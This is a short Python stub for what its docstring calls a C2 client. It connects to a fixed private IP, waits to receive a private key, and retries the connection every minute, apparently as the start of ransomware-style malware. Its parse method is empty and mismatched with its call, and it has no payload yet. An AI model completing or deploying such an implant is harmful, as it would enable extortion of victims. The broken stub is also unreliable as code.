from cryptography.hazmat.primitives.asymmetric import rsa
import socket
import time

"""
Connect to c2 -> c2 sends private key -> waits
"""

RETRY_TIME = 60
HOST = "192.168.101.70"
PORT = 80


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        try:
            self.socket.connect((self.host, self.port))
            print(f"Connected to server at {self.host}:{self.port}")
        except:
            self.retry()

    def run(self):
        while True:
            try:
                data = self.socket.recv(2048)
                self.parse(data)
            except:
                # no data or disconnect
                self.retry()

    
    def parse(self):
        pass

    def retry(self):
        print("Couldnt connect retry in", RETRY_TIME)
        time.sleep(RETRY_TIME)
        self.connect()
